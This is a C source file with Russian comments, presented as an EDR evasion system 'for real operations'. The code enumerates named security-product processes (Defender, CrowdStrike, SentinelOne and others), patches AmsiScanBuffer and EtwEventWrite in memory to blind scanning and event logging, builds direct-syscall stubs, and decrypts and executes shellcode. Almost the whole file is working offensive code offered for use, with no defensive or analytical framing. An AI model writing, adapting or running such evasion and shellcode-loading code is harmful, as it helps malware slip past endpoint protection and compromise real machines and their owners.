/**
 * @file phantom_edr_bypass.c
 * @brief Невидимая система обхода EDR для реальных операций
 */

#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Типы для работы с прямыми системными вызовами
typedef NTSTATUS (NTAPI *NtAllocateVirtualMemoryFn)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *NtProtectVirtualMemoryFn)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

// Определения для теневого вызова WinAPI
#define RVA2VA(Type, DllBase, Rva) (Type)((ULONG_PTR) DllBase + Rva)

// Кодовые трамплины для обхода инструментации
typedef struct _TRAMPOLINE_ENTRY {
    BYTE original_bytes[16];
    BYTE jmp_bytes[16];
    DWORD_PTR address;
    DWORD size;
    BOOL is_hooked;
} TRAMPOLINE_ENTRY;

// Таблица системных вызовов
static TRAMPOLINE_ENTRY SyscallTable[32];
static BOOL g_initialized = FALSE;
static BYTE g_amsi_pattern[] = { 0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x30 }; // AmsiScanBuffer сигнатура
static BYTE g_etw_pattern[] = { 0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0 }; // EtwEventWrite сигнатура  

// Инициализация системы обходов
BOOL InitializePhantomBypass() {
    if (g_initialized)
        return TRUE;
    
    memset(SyscallTable, 0, sizeof(SyscallTable));
    
    // Получение базовых адресов модулей
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    
    // Получение информации о модуле
    MODULEINFO modInfo = {0};
    if (!GetModuleInformation(GetCurrentProcess(), hNtdll, &modInfo, sizeof(modInfo)))
        return FALSE;
    
    // Поиск DOS и NT заголовков
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDosHeader->e_lfanew);
    
    // Получение таблицы экспорта
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)hNtdll + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    PDWORD pFunctions = (PDWORD)((BYTE*)hNtdll + pExportDir->AddressOfFunctions);
    PDWORD pNames = (PDWORD)((BYTE*)hNtdll + pExportDir->AddressOfNames);
    PWORD pOrdinals = (PWORD)((BYTE*)hNtdll + pExportDir->AddressOfNameOrdinals);
    
    // Сбор системных вызовов, которые нам нужны
    const char* target_functions[] = {
        "NtAllocateVirtualMemory",
        "NtFreeVirtualMemory",
        "NtProtectVirtualMemory",
        "NtReadVirtualMemory",
        "NtWriteVirtualMemory",
        "NtQueryInformationProcess",
        "NtQuerySystemInformation"
    };
    
    BYTE syscall_stub[] = {
        0x4C, 0x8B, 0xD1,               // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, syscall_number
        0x0F, 0x05,                     // syscall
        0xC3                            // ret
    };
    
    // Находим и сохраняем информацию о системных вызовах
    int tableIndex = 0;
    for (DWORD i = 0; i < pExportDir->NumberOfNames && tableIndex < 32; i++) {
        char* func_name = (char*)((BYTE*)hNtdll + pNames[i]);
        
        // Ищем только функции Nt*
        if (strncmp(func_name, "Nt", 2) == 0) {
            for (int j = 0; j < sizeof(target_functions) / sizeof(target_functions[0]); j++) {
                if (strcmp(func_name, target_functions[j]) == 0) {
                    DWORD func_rva = pFunctions[pOrdinals[i]];
                    LPVOID func_addr = (BYTE*)hNtdll + func_rva;
                    
                    // Получаем номер системного вызова (обычно в начале функции в eax)
                    BYTE* func_bytes = (BYTE*)func_addr;
                    DWORD syscall_num = 0;
                    
                    for (int k = 0; k < 20; k++) {
                        if (func_bytes[k] == 0xB8) { // mov eax, ...
                            syscall_num = *(DWORD*)&func_bytes[k + 1];
                            break;
                        }
                    }
                    
                    // Сохраняем информацию о системном вызове
                    memcpy(SyscallTable[tableIndex].original_bytes, func_addr, 16);
                    SyscallTable[tableIndex].address = (DWORD_PTR)func_addr;
                    SyscallTable[tableIndex].size = 16;
                    
                    // Создаем трамплин для системного вызова
                    DWORD old_protect;
                    void* trampoline = VirtualAlloc(NULL, sizeof(syscall_stub), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    if (trampoline) {
                        memcpy(trampoline, syscall_stub, sizeof(syscall_stub));
                        *(DWORD*)((BYTE*)trampoline + 4) = syscall_num; // Устанавливаем номер syscall
                        VirtualProtect(trampoline, sizeof(syscall_stub), PAGE_EXECUTE_READ, &old_protect);
                        
                        // Сохраняем адрес трамплина
                        memcpy(SyscallTable[tableIndex].jmp_bytes, trampoline, 16);
                        tableIndex++;
                    }
                    
                    break;
                }
            }
        }
    }
    
    g_initialized = TRUE;
    return TRUE;
}

// Функция для поиска EDR продуктов
BOOL DetectEDR() {
    BOOL edr_detected = FALSE;
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    
    // EDR процессы - сигнатуры
    const char* edr_processes[] = {
        "MsMpEng.exe",      // Windows Defender
        "NisSrv.exe",       // Windows Defender Network
        "csfalcon.exe",     // CrowdStrike
        "csagent.exe",      // CrowdStrike
        "SentinelAgent.exe",// SentinelOne
        "elastic-endpoint", // Elastic EDR
        "CbDefense",        // Carbon Black
        "bdservicehost.exe",// BitDefender
        "xagt.exe",         // FireEye
        NULL
    };
    
    // Получаем снимок процессов
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
        return FALSE;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return FALSE;
    }
    
    // Перебираем процессы
    do {
        for (int i = 0; edr_processes[i] != NULL; i++) {
            if (_stricmp(pe32.szExeFile, edr_processes[i]) == 0) {
                edr_detected = TRUE;
                break;
            }
        }
        
        if (edr_detected)
            break;
            
    } while (Process32Next(hProcessSnap, &pe32));
    
    CloseHandle(hProcessSnap);
    return edr_detected;
}

// Отключение AMSI
BOOL DisableAMSI() {
    // Загружаем библиотеку AMSI
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi)
        return FALSE; // Не установлен AMSI
    
    // Получаем адрес функции AmsiScanBuffer
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer)
        return FALSE;
    
    // Патч для AmsiScanBuffer - возвращаем AMSI_RESULT_CLEAN (0)
    BYTE patch[] = { 0x33, 0xC0, 0xC3 }; // xor eax, eax; ret
    
    // Изменяем права доступа к памяти
    DWORD oldProtect;
    if (!VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;
    
    // Применяем патч
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    
    // Восстанавливаем права доступа
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
    
    return TRUE;
}

// Отключение ETW (Event Tracing for Windows)
BOOL DisableETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll)
        return FALSE;
    
    // Находим EtwEventWrite
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite)
        return FALSE;
    
    // Патч для EtwEventWrite - всегда возвращаем STATUS_SUCCESS
    BYTE patch[] = { 0x33, 0xC0, 0xC3 }; // xor eax, eax; ret
    
    // Меняем права доступа
    DWORD oldProtect;
    if (!VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;
    
    // Применяем патч
    memcpy(pEtwEventWrite, patch, sizeof(patch));
    
    // Восстанавливаем защиту
    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
    
    return TRUE;
}

// Прямой системный вызов - безопасная альтернатива WinAPI
NTSTATUS PhantomNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    if (!g_initialized)
        InitializePhantomBypass();
    
    // Вызываем через трамплин для обхода EDR мониторинга
    typedef NTSTATUS (NTAPI *pFn)(
        HANDLE ProcessHandle,
        PVOID *BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    );
    
    pFn fn = (pFn)SyscallTable[0].jmp_bytes;
    return fn(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

// Защищенное выделение памяти с обфускацией
LPVOID PhantomAllocateMemory(SIZE_T size, DWORD protection) {
    PVOID address = NULL;
    SIZE_T region_size = size;
    
    // Обход EDR через прямой syscall
    NTSTATUS status = PhantomNtAllocateVirtualMemory(
        GetCurrentProcess(),
        &address,
        0,
        &region_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (status != 0) {
        return NULL;
    }
    
    // Инициализация памяти случайным образом для защиты от сканеров
    BYTE* ptr = (BYTE*)address;
    for (SIZE_T i = 0; i < size; i++) {
        ptr[i] = (BYTE)(rand() & 0xFF);
    }
    
    // Устанавливаем требуемую защиту
    if (protection != PAGE_READWRITE) {
        DWORD old_protect;
        VirtualProtect(address, size, protection, &old_protect);
    }
    
    return address;
}

// Выполнение шелл-кода с обходом защиты
BOOL PhantomExecuteShellcode(PBYTE shellcode, SIZE_T size) {
    // Обнаружение EDR
    BOOL edr_detected = DetectEDR();
    
    // Если обнаружен EDR, применяем дополнительные техники обхода
    if (edr_detected) {
        // Отключаем механизмы мониторинга
        DisableAMSI();
        DisableETW();
    }
    
    // Выделяем память для шелл-кода
    LPVOID memory = PhantomAllocateMemory(size, PAGE_READWRITE);
    if (!memory)
        return FALSE;
    
    // Копируем шелл-код в память
    memcpy(memory, shellcode, size);
    
    // Изменяем защиту памяти на исполняемую
    DWORD old_protect;
    if (!VirtualProtect(memory, size, PAGE_EXECUTE_READ, &old_protect))
        return FALSE;
    
    // Выполняем шелл-код
    VOID (*shellcode_func)() = (VOID (*)())(memory);
    shellcode_func();
    
    return TRUE;
}

// Расшифровка зашифрованного шелл-кода
PBYTE PhantomDecryptShellcode(PBYTE encrypted, SIZE_T size, PBYTE key, SIZE_T key_size) {
    PBYTE decrypted = (PBYTE)malloc(size);
    if (!decrypted)
        return NULL;
    
    // Расшифровка RC4-подобным алгоритмом с дополнительной обфускацией
    for (SIZE_T i = 0; i < size; i++) {
        BYTE k = key[i % key_size];
        BYTE offset = (BYTE)(i & 0xFF);
        decrypted[i] = encrypted[i] ^ k ^ offset ^ 0xAA;
    }
    
    return decrypted;
}